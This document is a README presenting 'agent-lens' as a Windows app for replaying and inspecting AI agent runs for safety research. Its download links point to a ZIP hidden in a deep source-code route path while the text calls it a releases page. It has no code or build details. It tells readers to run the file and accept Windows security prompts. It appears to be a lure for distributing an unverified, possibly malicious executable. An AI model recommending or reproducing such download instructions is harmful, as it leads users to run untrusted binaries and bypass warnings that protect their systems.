# 🧠 agent-lens - Replay and inspect AI agent runs

[![Download agent-lens](https://img.shields.io/badge/Download%20agent-lens-blue?style=for-the-badge)](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)

## 🔍 What is agent-lens?

agent-lens is a Windows app for viewing, replaying, and checking AI agent runs. It helps you inspect what an agent did, when it did it, and how its decisions unfolded over time.

Use it to:
- open saved agent runs
- step through events in order
- review messages, tool use, and outputs
- compare runs side by side
- study agent behavior for safety and interpretability work

It is built for research, review, and trace analysis. It keeps the focus on what happened, not on setup work.

## 🪟 Windows download

Visit the releases page to download and run the app:

[Download agent-lens for Windows](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)

On the releases page, look for the latest version and download the Windows file that matches your system. After the file finishes downloading, open it to start the app.

## ⚙️ Before you start

For a smooth install, check these basics:

- Windows 10 or Windows 11
- An internet connection for the first download
- Enough disk space for the app and saved run data
- Permission to open downloaded apps on your PC

If you plan to review large agent traces, a computer with more memory helps keep playback smooth.

## 📦 How to install

1. Open the releases page.
2. Find the latest release near the top.
3. Download the Windows app file.
4. Wait for the download to finish.
5. Open the file from your Downloads folder.
6. If Windows asks for confirmation, choose Open or Run.
7. Follow the on-screen steps until the app starts.

If the file comes in a ZIP folder, right-click it and choose Extract All before opening the app.

## 🚀 First run

When you open agent-lens for the first time, you may see a simple setup screen. From there, you can load a saved run file or open a folder with trace data.

Typical first steps:
- choose a run to inspect
- wait for the data to load
- use the timeline to move through events
- click events to see details
- review messages, actions, and tool results

If you already have exported agent logs, you can point the app at that folder or file and begin right away.

## 🧭 What you can do in the app

### 👁️ Review agent activity
See each step the agent took in order. This helps you follow the full path from prompt to final output.

### ⏪ Replay runs
Move back and forth through a run to study how the agent changed course.

### 🧾 Inspect trace details
Open event data to see messages, tool calls, model outputs, and timestamps.

### 🔎 Compare behavior
Use multiple runs to spot differences in decisions, sequence, and results.

### 🛡️ Support research work
Use the app to study alignment, safety, failure cases, and agent behavior patterns.

## 🗂️ Supported data

agent-lens is designed to work with saved agent traces and replay files. Common inputs include:

- JSON trace files
- exported session folders
- event logs from agent runs
- structured run data from local experiments

For best results, keep your files in one folder and avoid changing names after export.

## 🧩 Common workflow

A simple review flow looks like this:

1. Export or copy the agent run data.
2. Open agent-lens.
3. Load the trace or folder.
4. Select a run from the list.
5. Move through the timeline.
6. Read the event details.
7. Compare it with another run if needed.

This makes it easier to study where a run stayed on track or drifted from the goal.

## 🖥️ Interface overview

The app is built to stay readable on a normal desktop screen.

You may see:
- a run list on the left
- a main replay view in the center
- an event detail panel
- a timeline or step bar
- filters for event types or tools
- search for text inside a run

The layout keeps the main trace in view while giving you access to the data behind each step.

## 🔐 Privacy and local use

agent-lens is meant for local review of agent data. That makes it useful when you want to inspect runs without sharing them across services.

Good local habits:
- keep trace files in a private folder
- store research data in a trusted location
- remove files you no longer need
- use a separate folder for test runs and real runs

## 🛠️ Troubleshooting

### The file will not open
Try these steps:
- make sure the download finished
- check that you opened the right file
- if it is in a ZIP file, extract it first
- try running it again from the Downloads folder

### Windows blocks the app
If Windows shows a security prompt, choose the option to open or run the file if you trust the download source.

### The app opens but no data appears
Check that you loaded the right trace file or folder. Some trace exports use nested folders, so try the main export folder first.

### Playback feels slow
Large runs can take time to load. Close other apps, then reopen agent-lens and try again.

### Text looks too small
Use the Windows display settings or app zoom controls if available. A higher screen scale can make trace review easier.

## 🧪 Example use cases

agent-lens fits several kinds of review work:

- studying how an assistant responds to prompts
- checking where a tool call changed the path of a run
- reviewing steps that led to a failure
- comparing a safe run with a risky run
- reading agent output line by line during research
- looking for behavior that may matter in interpretability analysis

## 📁 File handling tips

To keep your work organized:
- store each run in its own folder
- use clear names like `run-01`, `test-run`, or `evaluation-set`
- keep original exports unchanged
- back up important traces before editing or moving them

This helps when you return to a case later and need the same data again.

## 🧠 Why people use agent-lens

Agent traces can be hard to read as plain text. A replay tool makes them easier to scan and compare.

agent-lens helps you:
- follow a run in order
- see the shape of a decision process
- spot repeated tool use
- review edge cases
- compare outcomes across runs
- study behavior with more context

That makes it useful for alignment work, interpretability review, and research notes.

## 🏷️ Topics

ai, alignment, interpretability, observability, safety

## 📥 Download and setup link

Visit the releases page to download and run the Windows app:

[https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip](https://github.com/winless-boozing857/agent-lens/raw/refs/heads/main/ui/src/routes/runs/[runName]/sessions/[sessionIndex]/subagents/[filename]/lens-agent-2.2.zip)

After you download it, open the file and follow the prompts on your screen

## 🔗 Reference

Repository: agent-lens  
Description: Agent observability and replay tooling for AI safety & interpretability research